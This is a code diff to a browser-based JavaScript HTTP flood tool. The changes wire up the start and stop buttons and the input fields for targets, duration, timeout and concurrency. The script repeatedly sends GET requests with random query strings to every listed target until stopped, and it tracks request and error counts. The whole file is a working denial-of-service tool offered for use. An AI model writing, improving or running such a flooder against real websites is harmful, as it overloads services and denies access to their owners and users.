@@ -1,7 +1,7 @@
 var textarea = document.getElementById('targets');
-var time = document.getElementById('time').value;
-var timeout = document.getElementById('timeout').value;
-var threads = document.getElementById('threads').value;
+var time = document.getElementById('time');
+var timeout = document.getElementById('timeout');
+var threads = document.getElementById('threads');
 var start = document.getElementById('start');
 var stop = document.getElementById('stop');
 var stats = document.getElementById('stats');
@@ -12,6 +12,13 @@ var queue = [];
 var tbody, targets, generateTable, stopFlood, rand;
 
 function StartFlood() {
+    textarea.disabled = true;
+    time.disabled = true;
+    timeout.disabled = true;
+    threads.disabled = true;
+    start.disabled = true;
+    stop.disabled = false;
+
     targets = textarea.value.split('\n');
     targets.forEach((target) => {
         targetStats[target] = {requests: 0, responses: 0, errors: 0, errorMessage: ''}
@@ -22,13 +29,21 @@ function StartFlood() {
         tbody = document.querySelector('tbody');
         firstTime = false;
     }
+
     interval = setInterval(GenerateTable, 1000);
-    stopFlood = setTimeout(StopFlood, time*1000);
+    stopFlood = setTimeout(StopFlood, time.value*1000);
     isStarted = true;
     targets.map(Flood);
 }
 
 function StopFlood() {
+    textarea.disabled = false;
+    time.disabled = false;
+    timeout.disabled = false;
+    threads.disabled = false;
+    stop.disabled = true;
+    start.disabled = false;
+
     clearInterval(generateTable);
     clearTimeout(stopFlood);
     isStarted = false;
@@ -43,24 +58,26 @@ function GenerateTable() {
 
 async function FetchWithTimeout(url) {
     const controller = new AbortController();
-    const fetchTimeOut = setTimeout(() => controller.abort(), timeout);
+    const fetchTimeout = setTimeout(() => controller.abort(), timeout.value);
+
     return fetch(url, {
         method: 'GET',
         mode: 'no-cors',
         signal: controller.signal
       }).then((response) => {
-        clearTimeout(fetchTimeOut);
+        clearTimeout(fetchTimeout);
         return response;
       }).catch((error) => {
-        clearTimeout(fetchTimeOut);
+        clearTimeout(fetchTimeout);
         throw error;
       });
 }
 
 async function Flood(target) {
     while(isStarted) {
-        if(queue.length > threads) await queue.shift();
+        if(queue.length > threads.value) await queue.shift();
         rand = '?' + Math.floor(Math.random() * 1000);
+        
         queue.push(FetchWithTimeout(target+rand)
         .catch((error) => { 
             if (error.code === 20) return;
@@ -78,3 +95,7 @@ async function Flood(target) {
         targetStats[target].requests++;
     }
 }
+
+stop.disabled = true;
+start.addEventListener("click", StartFlood);
+stop.addEventListener("click", StopFlood);
